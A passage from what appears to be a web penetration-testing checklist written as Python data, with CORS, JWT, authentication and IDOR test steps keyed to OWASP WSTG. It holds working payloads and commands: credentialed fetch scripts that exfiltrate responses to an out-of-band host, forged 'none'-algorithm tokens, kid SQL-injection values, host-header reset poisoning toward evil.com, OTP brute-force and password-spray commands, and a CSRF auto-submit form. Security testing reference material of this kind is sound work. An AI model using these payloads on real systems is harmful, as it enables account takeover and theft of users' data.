                "HTTP origin is attackable via network MITM or if trusted.com has "
                "any HTTP page you can inject into."
            ),
            "payloads": [
                "http://trusted.com",
                "http://target.com",
            ],
        },
        {
            "id": "cors_07",
            "name": "Non-standard port CORS",
            "detail": (
                "If whitelisting is port-sensitive, try: https://trusted.com:8080. "
                "If the app only checks the hostname and ignores the port, "
                "any port on a permitted hostname is accepted."
            ),
            "payloads": [
                "https://trusted.com:8080",
                "https://trusted.com:3000",
                "https://trusted.com:65535",
            ],
        },
        {
            "id": "cors_08",
            "name": "Pre-flight bypass — simple requests",
            "detail": (
                "Simple requests (GET/POST with form content-type) do not trigger "
                "pre-flight. They are sent with credentials automatically. "
                "Test if sensitive GET endpoints are readable without pre-flight CORS check."
            ),
        },
        {
            "id": "cors_09",
            "name": "CORS with credentials — exploit PoC",
            "detail": (
                "If ACAO reflects origin AND ACAC: true, craft a PoC HTML that "
                "makes a credentialed XHR from an attacker-controlled page "
                "and exfiltrates the response."
            ),
            "payloads": [
                # Full PoC
                "<script>fetch('https://TARGET/api/account',{credentials:'include'})"
                ".then(r=>r.text()).then(d=>{"
                "new Image().src='https://OOB/?data='+encodeURIComponent(d)"
                "})</script>",
            ],
        },
        {
            "id": "cors_10",
            "name": "CORS on API endpoints returning tokens",
            "detail": (
                "Target endpoints like /api/token, /api/session, /oauth/token — "
                "if CORS is misconfigured on these, an attacker can steal access "
                "tokens cross-origin."
            ),
        },
        {
            "id": "cors_11",
            "name": "Automated CORS scanning",
            "detail": "Use CORScanner and corsy for bulk endpoint testing.",
            "commands": [
                "python3 corsy.py -u https://TARGET -t 10",
                "python3 corsy.py -i endpoints.txt -t 10 -o cors_results.json",
                "python3 CORScanner.py -u https://TARGET",
                "nuclei -t misconfiguration/cors-misconfiguration.yaml -l urls.txt",
            ],
        },
        {
            "id": "cors_12",
            "name": "Wildcard ACAO without credentials — limited impact",
            "detail": (
                "ACAO: * without ACAC: true allows any origin to read unauthenticated "
                "responses. Not directly exploitable for credential theft, but "
                "may expose unauthenticated data or assist in other attacks."
            ),
        },
        {
            "id": "cors_13",
            "name": "Vary: Origin header absence",
            "detail": (
                "If CORS responses are cached without Vary: Origin, a cache may "
                "serve a response with someone else's ACAO header. Test with a "
                "CDN-cached endpoint — inject Origin, check if cached response "
                "reflects your origin to subsequent requests without Origin header."
            ),
            "commands": [
                "curl -sI -H 'Origin: https://evil.com' 'https://TARGET/api/data' | grep -i 'access-control\\|vary\\|cache'",
                "curl -sI 'https://TARGET/api/data' | grep -i 'access-control'",
            ],
        },
        {
            "id": "cors_14",
            "name": "CORS preflight OPTIONS method analysis",
            "detail": (
                "Send a pre-flight OPTIONS request with: "
                "Origin: evil.com, "
                "Access-Control-Request-Method: DELETE, "
                "Access-Control-Request-Headers: Authorization. "
                "If the server responds with ACAM: DELETE and ACAH: Authorization "
                "along with a permissive ACAO, all HTTP methods are allowed cross-origin."
            ),
            "commands": [
                "curl -X OPTIONS -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: DELETE' -H 'Access-Control-Request-Headers: Authorization' -sI https://TARGET/api/user",
                "# Look for ACAM (Access-Control-Allow-Methods) and ACAH (Access-Control-Allow-Headers)",
            ],
        },
        {
            "id": "cors_15",
            "name": "Regex-based origin validation flaws",
            "detail": (
                "Apps using regex to validate origins often have flaws. "
                "Common mistakes: "
                "(1) /^https:\\/\\/target.com$/ — dot in regex matches any char: https://targetXcom passes, "
                "(2) Checking only suffix: .target.com — evil.target.com passes, "
                "(3) Missing anchor: target.com — attacker-target.com passes."
            ),
            "payloads": [
                "https://targetXcom.evil.com",       # Dot-as-wildcard
                "https://evilXtarget.com",            # Suffix check bypass
                "https://evil.com?origin=target.com", # Query string injection
                "https://target.com.evil.com",        # Suffix check bypass v2
                "https://notatarget.com",             # prefix check absent
            ],
        },
        {
            "id": "cors_16",
            "name": "Internal origin testing (intranet CORS)",
            "detail": (
                "If the app is an internal tool accessible on a private network, "
                "test if origins like http://localhost, http://127.0.0.1, "
                "or http://intranet are in the whitelist. Combined with SSRF "
                "or browser access from internal networks, this enables data exfiltration."
            ),
            "payloads": [
                "http://localhost",
                "http://127.0.0.1",
                "http://intranet",
                "http://internal.corp.com",
                "null",
            ],
        },
        {
            "id": "cors_17",
            "name": "Full exploit chain — CORS + XSS for credential exfiltration",
            "detail": (
                "If CORS is misconfigured AND the target also has XSS, combine them: "
                "(1) Use XSS on a whitelisted subdomain to send credentialed requests "
                "to the main app, "
                "(2) Use CORS to exfiltrate the response from the main app "
                "to the XSS-vulnerable subdomain, "
                "(3) Exfiltrate to attacker's OOB server."
            ),
            "payloads": [
                # Full chain PoC
                "fetch('https://MAINAPP/api/user',{credentials:'include'})"
                ".then(r=>r.text()).then(d=>fetch('https://OOB/?d='+btoa(d)))",
            ],
        },
        {
            "id": "cors_18",
            "name": "CORS on WebSocket upgrade requests",
            "detail": (
                "WebSocket connections use the Origin header. Unlike HTTP CORS, "
                "browsers do NOT enforce same-origin for WebSocket — they just send "
                "the Origin header. The server MUST validate it. "
                "Test by connecting from an unrelated origin using a simple WS client."
            ),
            "commands": [
                "# wscat with custom Origin",
                "wscat -c wss://TARGET/ws -H 'Origin: https://evil.com'",
                "# If connection is accepted and data flows, the WS endpoint has no origin check",
            ],
        },
        {
            "id": "cors_19",
            "name": "Verify full CORS attack PoC in a real browser",
            "detail": (
                "Always confirm CORS exploitability in a real browser (Chrome/Firefox). "
                "Automated tools may miss SameSite=Strict cookies, browser security zones, "
                "or HSTS preloading that affects the attack feasibility. "
                "Host the PoC on a VPS, visit it in an authenticated browser session, "
                "and confirm data is received at your OOB server."
            ),
        },
        {
            "id": "cors_20",
            "name": "Automated CORS bulk scanning across all endpoints",
            "detail": (
                "Use corsy or CORScanner against the full endpoint list. "
                "Prioritize endpoints that return sensitive data or set session tokens."
            ),
            "commands": [
                "python3 corsy.py -i endpoints.txt -t 20 --headers 'Cookie: SESSION=TOKEN' -o cors_results.json",
                "nuclei -t misconfiguration/cors-misconfiguration.yaml -l all_urls.txt -H 'Cookie: SESSION=TOKEN'",
            ],
        },
    ],
},


# ─────────────────────────────────────────────────────────────────────────────
# 4. JWT — JSON Web Token Attacks
# ─────────────────────────────────────────────────────────────────────────────
"jwt": {
    "title": "JWT Vulnerabilities",
    "wstg_ids": ["WSTG-SESS-10"],
    "tools": ["jwt_tool", "hashcat", "john", "Burp JWT Editor plugin"],
    "steps": [
        {
            "id": "jwt_01",
            "name": "Identify JWT usage",
            "detail": (
                "Find JWTs in: Authorization: Bearer header, cookies (auth_token, "
                "jwt, access_token, id_token), URL params, JSON response bodies. "
                "JWTs are three base64url-encoded parts separated by dots."
            ),
            "commands": [
                "# Decode header+payload without verification",
                "echo 'HEADER.PAYLOAD.SIGNATURE' | cut -d'.' -f1 | base64 -d 2>/dev/null",
                "echo 'HEADER.PAYLOAD.SIGNATURE' | cut -d'.' -f2 | base64 -d 2>/dev/null",
                "# Or use jwt_tool",
                "python3 jwt_tool.py TOKEN",
            ],
        },
        {
            "id": "jwt_02",
            "name": "Algorithm: none attack",
            "detail": (
                "Change the alg header to 'none', 'None', 'NONE', 'nOnE'. "
                "Remove the signature (keep the trailing dot). "
                "If the server accepts this, it verifies no signature — "
                "any payload can be forged."
            ),
            "payloads": [
                # Header: {"alg":"none","typ":"JWT"}
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
                # Full token with admin payload and empty signature:
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.",  # gitleaks:allow
            ],
            "commands": [
                "python3 jwt_tool.py TOKEN -X a",
                "# Variants: alg=None, alg=NONE, alg=nOnE",
            ],
        },
        {
            "id": "jwt_03",
            "name": "Algorithm confusion: RS256 → HS256",
            "detail": (
                "If the server uses RS256 (asymmetric), it has a public key. "
                "Switch alg to HS256 (symmetric) and sign with the PUBLIC KEY as "
                "the HMAC secret. The server may verify HS256 using the same public "
                "key it uses for RS256 verification."
            ),
            "commands": [
                "# Get public key from /jwks.json, /.well-known/jwks.json, or /api/keys",
                "curl https://TARGET/.well-known/jwks.json",
                "# Generate forged token",
                "python3 jwt_tool.py TOKEN -X k -pk public_key.pem",
                "# Or manually:",
                "# Set alg=HS256, sign with HMAC-SHA256 using public_key.pem content as secret",
            ],
        },
        {
            "id": "jwt_04",
            "name": "Weak secret brute force",
            "detail": (
                "If alg=HS256/HS384/HS512 and the secret is weak (common words, "
                "short string, default config value), brute-force it offline."
            ),
            "commands": [
                "# hashcat",
                "hashcat -a 0 -m 16500 'TOKEN' /usr/share/wordlists/rockyou.txt",
                "# john",
                "echo 'TOKEN' > jwt.txt && john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256",
                "# jwt_tool built-in",
                "python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt",
            ],
        },
        {
            "id": "jwt_05",
            "name": "kid (Key ID) injection — SQL injection",
            "detail": (
                "The kid header specifies which key to use. If the server uses "
                "kid in a SQL query to fetch the key, inject SQL. "
                "Set kid to a SQLi payload that returns a known value, then "
                "sign with that known value."
            ),
            "payloads": [
                # kid SQL injection — query returns empty string → sign with empty string
                "' UNION SELECT 'attackersecret' -- -",
                "1 OR 1=1",
                "nonexistent_key' OR '1'='1",
                # kid path traversal
                "../../dev/null",
                "../../../dev/null",
                "/dev/null",
            ],
            "commands": [
                "python3 jwt_tool.py TOKEN -I -hc kid -hv \"' UNION SELECT 'attackersecret' -- -\" -S hs256 -p attackersecret",
            ],
        },
        {
            "id": "jwt_06",
            "name": "kid injection — path traversal",
            "detail": (
                "If the kid is used as a filename for reading the key, traverse "
                "to /dev/null (empty content → sign with empty string) or a file "
                "with known content."
            ),
            "commands": [
                "python3 jwt_tool.py TOKEN -I -hc kid -hv '../../dev/null' -S hs256 -p ''",
                "python3 jwt_tool.py TOKEN -I -hc kid -hv '/dev/null' -S hs256 -p ''",
            ],
        },
        {
            "id": "jwt_07",
            "name": "jku (JWK Set URL) header injection",
            "detail": (
                "The jku header tells the server where to fetch the JWK Set for "
                "verification. Host your own JWK Set with a keypair you control, "
                "set jku to your URL, sign with your private key."
            ),
            "commands": [
                "python3 jwt_tool.py TOKEN -X s",
                "# jwt_tool hosts a temporary JWK endpoint automatically",
                "# Manual: generate RSA keypair, build jwks.json, host it, set jku in header",
                "openssl genrsa -out private.pem 2048",
                "openssl rsa -in private.pem -pubout -out public.pem",
            ],
        },
        {
            "id": "jwt_08",
            "name": "x5u / x5c header injection",
            "detail": (
                "x5u is a URL to a certificate chain used for verification. "
                "x5c is a certificate embedded directly in the header. "
                "Inject a self-signed certificate that you control."
            ),
            "commands": [
                "python3 jwt_tool.py TOKEN -X c",   # x5c injection
                "python3 jwt_tool.py TOKEN -X u",   # x5u injection
            ],
        },
        {
            "id": "jwt_09",
            "name": "jwk (JSON Web Key) header injection",
            "detail": (
                "The jwk header embeds the public key directly. Some libraries "
                "use the embedded key to verify the signature — "
                "attacker embeds their own public key and signs with matching private key."
            ),
            "commands": [
                "python3 jwt_tool.py TOKEN -X n",   # embed own JWK
            ],
        },
        {
            "id": "jwt_10",
            "name": "Claim manipulation — privilege escalation",
            "detail": (
                "Decode the payload and modify claims: "
                "role: user → role: admin, "
                "is_admin: false → is_admin: true, "
                "user_id: 123 → user_id: 1, "
                "scope: read → scope: write admin. "
                "Re-sign if you have the secret, or test if signature is verified."
            ),
            "commands": [
                "python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p SECRET",
                "python3 jwt_tool.py TOKEN -I -pc is_admin -pv true",
            ],
        },
        {
            "id": "jwt_11",
            "name": "Expired token reuse",
            "detail": (
                "Check if the exp claim is validated. Send an obviously expired "
                "token (exp in the past). If the server accepts it, expiry is not "
                "enforced — captured tokens can be reused indefinitely."
            ),
            "commands": [
                "# Decode, change exp to a past timestamp, re-sign or test without re-signing",
                "python3 jwt_tool.py TOKEN -I -pc exp -pv 1 -S hs256 -p SECRET",
            ],
        },
        {
            "id": "jwt_12",
            "name": "ECDSA algorithm confusion (ES256 key confusion)",
            "detail": (
                "Similar to RS256→HS256 but for ECDSA. If the server uses ES256, "
                "try switching to HS256 and signing with the ECDSA public key as HMAC secret."
            ),
            "commands": [
                "python3 jwt_tool.py TOKEN -X k -pk ecdsa_public.pem",
            ],
        },
        {
            "id": "jwt_13",
            "name": "Nested JWT (JWT inside JWT)",
            "detail": (
                "Some libraries process nested JWTs without full verification of "
                "the inner token. Test by wrapping a forged inner JWT in an outer "
                "legitimate JWT."
            ),
        },
        {
            "id": "jwt_14",
            "name": "JWT in cookies — HttpOnly bypass via XSS",
            "detail": (
                "If JWT is stored in an HttpOnly cookie, XSS is needed to steal it. "
                "If stored in localStorage or a non-HttpOnly cookie, XSS is enough."
            ),
        },
        {
            "id": "jwt_15",
            "name": "Automated JWT testing with jwt_tool",
            "detail": "Run jwt_tool in automated mode against all endpoints.",
            "commands": [
                "python3 jwt_tool.py TOKEN -t https://TARGET/api/admin -rh 'Authorization: Bearer TOKEN' -M pb",
                "# -M pb = 'playbook' — runs all injection attacks automatically",
                "python3 jwt_tool.py TOKEN -X a -X s -X n -X k -X c",
            ],
        },
        {
            "id": "jwt_16",
            "name": "Check JWKS endpoint for key exposure",
            "detail": (
                "Fetch /.well-known/jwks.json, /api/jwks, /jwks.json. "
                "Check if private keys are accidentally exposed (n, e, d, p, q fields). "
                "A private key exposure allows complete token forgery."
            ),
            "commands": [
                "curl https://TARGET/.well-known/jwks.json | jq .",
                "# Check for 'd' field in any key (private exponent — should never be present)",
            ],
        },
        {
            "id": "jwt_17",
            "name": "Token replay across environments",
            "detail": (
                "Test if a production JWT works in staging (shared secret). "
                "Test if a JWT from one service works on another microservice "
                "(absent audience validation)."
            ),
        },
        {
            "id": "jwt_18",
            "name": "Missing audience (aud) claim validation",
            "detail": (
                "A JWT with aud: service-A should not be accepted by service-B. "
                "Test: take a token issued for one API (e.g., aud: 'api.payments.com') "
                "and send it to another API (e.g., api.admin.com). "
                "If accepted, there is no audience check."
            ),
            "commands": [
                "# Decode token, check 'aud' claim",
                "python3 jwt_tool.py TOKEN | grep aud",
                "# Craft token with arbitrary audience and send to multiple endpoints",
                "python3 jwt_tool.py TOKEN -I -pc aud -pv 'admin_api' -S hs256 -p SECRET",
            ],
        },
        {
            "id": "jwt_19",
            "name": "Sensitive data exposure in JWT payload",
            "detail": (
                "JWT payloads are base64-encoded but NOT encrypted (unless using JWE). "
                "Inspect the payload for: passwords, PII, API keys, internal paths, "
                "database connection strings, or other sensitive data that should "
                "not be in a client-visible token."
            ),
            "commands": [
                "echo 'PAYLOAD_PART' | base64 -d 2>/dev/null | python3 -m json.tool",
                "python3 jwt_tool.py TOKEN",
            ],
        },
        {
            "id": "jwt_20",
            "name": "JWT injection via cookie parameters",
            "detail": (
                "Some apps place JWTs in cookies alongside other session mechanisms. "
                "Test: delete the JWT cookie and use only the session cookie. "
                "Delete the session cookie and use only the JWT. "
                "Modify the JWT in the cookie — test if cookie-based JWT is verified."
            ),
        },
        {
            "id": "jwt_21",
            "name": "JWT crit (Critical) header parameter abuse",
            "detail": (
                "The 'crit' header lists extensions that MUST be understood by the "
                "recipient. If an unknown extension is listed in crit, a compliant "
                "implementation MUST reject the token. Some libraries ignore 'crit' "
                "entirely — inject an unknown critical extension and test if token is "
                "accepted."
            ),
            "payloads": [
                # header with crit claiming custom extension
                '{"alg":"HS256","typ":"JWT","crit":["unknownExt"],"unknownExt":"malicious"}',
            ],
        },
        {
            "id": "jwt_22",
            "name": "Token storage audit — localStorage vs HttpOnly cookie",
            "detail": (
                "Check where JWT is stored client-side. "
                "localStorage and sessionStorage are accessible via JS (XSS risk). "
                "HttpOnly cookies are not accessible via JS but are sent with every request. "
                "memory-only storage (variable) is the most secure but resets on page reload. "
                "Document the storage mechanism as part of the security assessment."
            ),
            "commands": [
                "# In browser console:",
                "# localStorage.getItem('token')  // JWT in localStorage?",
                "# document.cookie               // JWT in non-HttpOnly cookie?",
                "# Check Network tab for Authorization header (token in memory)",
            ],
        },
    ],
},


# ─────────────────────────────────────────────────────────────────────────────
# 5. AUTH — Authentication & Authorization Flaws
# ─────────────────────────────────────────────────────────────────────────────
"auth": {
    "title": "Authentication & Session Security",
    "wstg_ids": [
        "WSTG-ATHN-01", "WSTG-ATHN-02", "WSTG-ATHN-03", "WSTG-ATHN-04",
        "WSTG-ATHN-05", "WSTG-ATHN-06", "WSTG-ATHN-07", "WSTG-ATHN-08",
        "WSTG-ATHN-09", "WSTG-ATHN-10",
        "WSTG-SESS-01", "WSTG-SESS-02", "WSTG-SESS-03", "WSTG-SESS-04",
        "WSTG-SESS-05", "WSTG-SESS-06", "WSTG-SESS-07",
        "WSTG-IDNT-04",
    ],
    "tools": ["ffuf", "hydra", "burp intruder", "nuclei", "oauth2_scanner"],
    "steps": [
        {
            "id": "auth_01",
            "name": "Username enumeration — response differences",
            "detail": (
                "Submit valid and invalid usernames at login/registration/reset endpoints. "
                "Compare: HTTP status code, response body text, response size, "
                "response time. A difference confirms valid usernames. "
                "Also test email enumeration in registration ('email already taken')."
            ),
            "commands": [
                "ffuf -u https://TARGET/login -X POST -d 'username=FUZZ&password=wrongpass' -w usernames.txt -mr 'incorrect password'",
                "# Timing-based: valid users may be slower (DB lookup + bcrypt)",
                "ffuf -u https://TARGET/login -X POST -d 'username=FUZZ&password=x' -w usernames.txt -of csv -o timing.csv",
            ],
        },
        {
            "id": "auth_02",
            "name": "Username enumeration — timing side-channel",
            "detail": (
                "Even with identical error messages, timing differences reveal valid "
                "usernames. Use a statistical test: send 50 requests for each "
                "username and compare mean response times. Difference >100ms is significant."
            ),
            "commands": [
                "# Use Burp Turbo Intruder or ffuf with -t 1 for serial timing measurement",
                "python3 -c \"\nimport requests, time, statistics\nfor user in open('users.txt'):\n    times=[]\n    for _ in range(5):\n        s=time.time()\n        requests.post('https://TARGET/login',data={'u':user.strip(),'p':'x'})\n        times.append(time.time()-s)\n    print(user.strip(),statistics.mean(times))\n\"",
            ],
        },
        {
            "id": "auth_03",
            "name": "Rate limit bypass techniques",
            "detail": (
                "When rate limiting blocks brute force, try: "
                "(1) X-Forwarded-For: rotation through IP list, "
                "(2) X-Real-IP header injection, "
                "(3) Adding null bytes or whitespace to credentials, "
                "(4) Changing User-Agent between requests, "
                "(5) HTTP/2 multiplexing to send many requests simultaneously, "
                "(6) Case variation of credentials."
            ),
            "commands": [
                "# IP rotation via X-Forwarded-For",
                "ffuf -u https://TARGET/login -X POST -d 'u=admin&p=FUZZ' -w passwords.txt -H 'X-Forwarded-For: RATE_IP' -w ips.txt:RATE_IP",
                "# Add null byte to username to bypass exact-match rate limit",
                "# username=admin%00 may bypass rate limit keyed on exact username",
            ],
            "payloads": [
                "X-Forwarded-For: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "X-Host: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
            ],
        },
        {
            "id": "auth_04",
            "name": "Password reset — token predictability",
            "detail": (
                "Request multiple password reset tokens and analyse them for: "
                "(1) Sequential/predictable tokens, "
                "(2) Short tokens (6-digit OTPs brute-forced in <1M attempts), "
                "(3) Timestamp-based tokens (epoch seconds), "
                "(4) MD5/SHA1 of username+timestamp."
            ),
            "commands": [
                "# Request 10 tokens for a throwaway account, compare",
                "# Check entropy: token length, character set",
                "# If MD5-based: for t in $(seq EPOCH-60 EPOCH+60); do echo -n 'user@email.com'$t | md5sum; done",
            ],
        },
        {
            "id": "auth_05",
            "name": "Password reset — token reuse and expiry",
            "detail": (
                "After resetting a password, test if the old token still works. "
                "Test if tokens expire after a reasonable time (15-60 minutes). "
                "Test if requesting a new token invalidates the old one."
            ),
        },
        {
            "id": "auth_06",
            "name": "Password reset — host header poisoning",
            "detail": (
                "Inject a malicious Host header during reset link request. "
                "The reset email may contain a link pointing to the attacker's server. "
                "The victim clicks the link → attacker receives the reset token."
            ),
            "commands": [
                "curl -X POST 'https://TARGET/reset' -d 'email=victim@example.com' -H 'Host: evil.com'",
                "curl -X POST 'https://TARGET/reset' -d 'email=victim@example.com' -H 'Host: TARGET' -H 'X-Forwarded-Host: evil.com'",
            ],
        },
        {
            "id": "auth_07",
            "name": "Password reset — token leakage via Referer",
            "detail": (
                "If the reset link contains the token as a URL parameter and the "
                "reset page loads third-party resources (analytics, ads, fonts), "
                "the token is leaked in the Referer header to third parties."
            ),
        },
        {
            "id": "auth_08",
            "name": "Account takeover via password reset — no old password required",
            "detail": (
                "Test if authenticated users can change their password without "
                "confirming the current password. If not required, any XSS or CSRF "
                "allows password change without old password knowledge."
            ),
        },
        {
            "id": "auth_09",
            "name": "MFA bypass — OTP brute force",
            "detail": (
                "If the OTP is 6 digits (1,000,000 combinations) and no rate limit "
                "exists, brute force it. Also test: OTP reuse after first use, "
                "OTP for one account used on another, TOTP clock-drift tolerance."
            ),
            "commands": [
                "# Burp Intruder: iterate 000000–999999 on OTP field",
                "ffuf -u https://TARGET/verify-otp -X POST -d 'otp=FUZZ' -w <(seq -w 0 999999) -mc 200,302",
            ],
        },
        {
            "id": "auth_10",
            "name": "MFA bypass — response manipulation",
            "detail": (
                "Intercept MFA challenge response. Change response body from "
                "{\"success\":false} to {\"success\":true} or change HTTP 401 to 200. "
                "Some apps trust the client-side result of MFA verification."
            ),
        },
        {
            "id": "auth_11",
            "name": "MFA bypass — backup codes exhaustion and reuse",
            "detail": (
                "Test if backup codes are single-use. Test if backup codes can be "
                "brute-forced (limited set). Test if backup codes reset MFA completely."
            ),
        },
        {
            "id": "auth_12",
            "name": "Session fixation",
            "detail": (
                "Before login, note the session ID. After login, check if the session "
                "ID changes. If unchanged, force a victim to use a pre-known session "
                "ID (via URL parameter or cookie), then after they log in, "
                "use that session ID as an authenticated user."
            ),
            "commands": [
                "# 1. Get session: curl -c cookies.txt https://TARGET/login",
                "# 2. Login: curl -b cookies.txt -c cookies_post.txt -X POST -d 'user=x&pass=y' https://TARGET/login",
                "# 3. Compare: diff cookies.txt cookies_post.txt | grep session",
            ],
        },
        {
            "id": "auth_13",
            "name": "Session prediction — weak session token entropy",
            "detail": (
                "Collect 10+ session tokens. Analyse entropy: check for sequential "
                "patterns, timestamp-based values, short tokens, or predictable "
                "structure. Use Burp Sequencer for statistical analysis."
            ),
            "commands": [
                "# Burp Sequencer: capture token responses, run statistical analysis",
                "# OWASP recommendation: 128+ bits of entropy",
            ],
        },
        {
            "id": "auth_14",
            "name": "Concurrent session abuse",
            "detail": (
                "Login with the same account from two different sessions. "
                "Test if both sessions remain valid (no single-session enforcement). "
                "This allows attackers with a stolen session to maintain persistent access."
            ),
        },
        {
            "id": "auth_15",
            "name": "Remember-me token analysis",
            "detail": (
                "Capture the remember-me cookie. Test: "
                "(1) Does it expire? "
                "(2) Is it rotated on each use? "
                "(3) Is it tied to IP/UA? "
                "(4) Can it be used after password change/logout? "
                "(5) Is it predictable (username + timestamp + weak HMAC)?"
            ),
        },
        {
            "id": "auth_16",
            "name": "Password spray — slow brute force",
            "detail": (
                "Use the most common passwords against many accounts to avoid "
                "per-account lockout. Effective against enterprise apps with "
                "Active Directory (password123, Season+Year, CompanyName1!)."
            ),
            "commands": [
                "ffuf -u https://TARGET/login -X POST -d 'user=FUZZ&pass=Password1!' -w usernames.txt -t 1 -p 2",
                "spray -u https://TARGET/login -p 'Password1!' -ul usernames.txt --delay 30",
            ],
        },
        {
            "id": "auth_17",
            "name": "OAuth implicit flow abuse",
            "detail": (
                "Implicit flow returns access token in fragment. Attacks: "
                "(1) Token leakage via Referer header if redirect URL has analytics, "
                "(2) Open redirect in redirect_uri → token in fragment goes to attacker, "
                "(3) Cross-site request forgery on OAuth flow (missing state param), "
                "(4) Token reuse from different client."
            ),
            "commands": [
                "# Test state parameter — send without state, check if flow completes",
                "# Test redirect_uri manipulation:",
                "https://TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&response_type=token&scope=openid",
                "# Try: redirect_uri=https://target.com/callback/../redirect?url=https://evil.com",
            ],
        },
        {
            "id": "auth_18",
            "name": "OAuth authorization code interception",
            "detail": (
                "If redirect_uri is not strictly validated, intercept the code. "
                "Common bypasses: "
                "redirect_uri=https://TARGET.evil.com, "
                "redirect_uri=https://TARGET.com@evil.com, "
                "redirect_uri=https://TARGET.com/callback?extra=https://evil.com "
                "(open redirect chaining), "
                "redirect_uri=https://TARGET.com/../../evil_path."
            ),
        },
        {
            "id": "auth_19",
            "name": "SAML attacks — assertion manipulation",
            "detail": (
                "Test: "
                "(1) XML signature wrapping (XSW) — wrap the signed assertion with "
                "a malicious outer element, "
                "(2) Unsigned assertion — remove the Signature element, "
                "(3) XXE in SAML XML, "
                "(4) Comment injection in username field (admin<!--), "
                "(5) Replay of old assertions."
            ),
            "commands": [
                "# Use SAMLRaider Burp extension",
                "# Or SAML_Raider for automated XSW attacks",
                "python3 samlreattack.py --assertion assertion.xml --attack xsw",
            ],
            "payloads": [
                # Comment injection in NameID
                "admin<!--",
                "admin@example.com<!--",
                # Signature stripping — remove <Signature> element from XML
            ],
        },
        {
            "id": "auth_20",
            "name": "Cookie security attribute audit",
            "detail": (
                "Check all cookies for: "
                "Secure flag (not transmitted over HTTP), "
                "HttpOnly flag (not accessible via JS), "
                "SameSite=Lax|Strict (CSRF protection), "
                "Domain attribute scope (too broad?), "
                "Path attribute."
            ),
            "commands": [
                "curl -sI https://TARGET | grep -i 'set-cookie'",
                "# Expected: Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Strict",
            ],
        },
        {
            "id": "auth_21",
            "name": "CSRF — form-based state change without token",
            "detail": (
                "Identify state-changing endpoints (POST, PUT, DELETE). "
                "Test if they require: a CSRF token, an Origin/Referer check, "
                "a custom header (X-Requested-With). "
                "If none: craft a cross-site form submission PoC."
            ),
            "payloads": [
                # CSRF PoC HTML
                "<form action='https://TARGET/change-email' method='POST'>"
                "<input name='email' value='attacker@evil.com'>"
                "<input type='submit'></form>"
                "<script>document.forms[0].submit()</script>",
            ],
        },
        {
            "id": "auth_22",
            "name": "Logout and session invalidation",
            "detail": (
                "After logout, test if the session token is still accepted. "
                "If accepted, the server is not invalidating server-side sessions. "
                "A stolen session cookie remains valid indefinitely."
            ),
        },
        {
            "id": "auth_23",
            "name": "Default / hardcoded credentials",
            "detail": (
                "Test default credentials for admin panels, CMS, frameworks: "
                "admin:admin, admin:password, admin:123456, user:user, "
                "and application-specific defaults (Tomcat: tomcat:tomcat, "
                "Grafana: admin:admin, Jenkins: jenkins:jenkins)."
            ),
            "commands": [
                "nuclei -t default-logins/ -u https://TARGET",
            ],
        },
    ],
},


# ─────────────────────────────────────────────────────────────────────────────
# 6. IDOR — Insecure Direct Object Reference
# ─────────────────────────────────────────────────────────────────────────────
"idor": {
    "title": "Insecure Direct Object Reference (IDOR)",
    "wstg_ids": ["WSTG-ATHZ-04"],
    "tools": ["Autorize (Burp)", "AuthMatrix (Burp)", "ffuf", "nuclei"],
    "steps": [
        {
            "id": "idor_01",
            "name": "Enumerate all object references in the application",
            "detail": (
                "Spider the app and collect all parameters that reference objects: "
                "numeric IDs (id=123, user_id=456, order_id=789), "
                "UUIDs/GUIDs, "
                "hashed identifiers (md5/sha1 of IDs), "
                "filenames (/download?file=report.pdf), "
                "emails (/profile?email=user@ex.com), "
                "slugs (/post/my-first-post), "
                "encoded references (/api/token/abc123)."
            ),
        },
        {
            "id": "idor_02",
            "name": "Create two accounts for horizontal privilege test",
            "detail": (
                "Register Account A (victim) and Account B (attacker). "
                "Perform all actions as A, collect all object IDs. "
                "Switch to Account B session and attempt to access/modify "
                "A's objects using B's valid session."
            ),
        },
        {
            "id": "idor_03",
            "name": "Numeric ID IDOR — sequential enumeration",
            "detail": (
                "Change ID values: current ID ± 1, swap to another user's known ID, "
                "try 0, 1, 2 (often admin/system accounts), try negative numbers, "
                "try very large numbers (overflow), try non-integer strings."
            ),
            "payloads": [
                "id=0",
                "id=1",
                "id=2",
                "id=-1",
                "id=2147483647",   # INT_MAX
                "id=2147483648",   # INT overflow
                "id[]=1&id[]=2",   # Array bypass
                "id=1.0",          # Float
                "id=1%00",         # Null byte
            ],
            "commands": [
                "ffuf -u https://TARGET/api/user?id=FUZZ -w <(seq 1 1000) -mc 200 -fr 'not found'",
            ],
        },
        {
            "id": "idor_04",
            "name": "UUID/GUID IDOR — harvesting and guessing",
            "detail": (
                "UUIDs are not secret. Find exposed UUIDs: API responses, emails, "
                "public pages. Test if any UUID found for one resource gives access "
                "to another. Also: old v1 UUIDs are time-based and can be predicted "
                "within a small window."
            ),
            "commands": [
                "# Extract all UUIDs from response bodies",
                "grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' response.txt",
                "# Test each extracted UUID against all object endpoints",
            ],
        },
        {
            "id": "idor_05",
            "name": "Hashed ID IDOR — decode and re-encode",
            "detail": (
                "Hashed IDs (MD5/SHA1 of numeric ID) look opaque but are predictable. "
                "Test: if /api/user/5f4dcc3b5aa765d61d8327deb882cf99 → MD5('password'), "
                "compute MD5 of 1,2,3... to enumerate users."
            ),
            "commands": [
                "# If MD5-based, generate MD5s of sequential IDs",
                "for i in $(seq 1 100); do echo -n $i | md5sum | cut -d' ' -f1; done | head -20",
                "# Or SHA1:",
                "for i in $(seq 1 100); do printf '%040x' $(sha1sum <<<$i | cut -d' ' -f1); done",
            ],
        },
        {
            "id": "idor_06",
            "name": "Indirect reference — filename and path IDOR",
            "detail": (
                "When files are referenced by name: /download?file=my_report.pdf — "
                "try path traversal to access other users' files. "
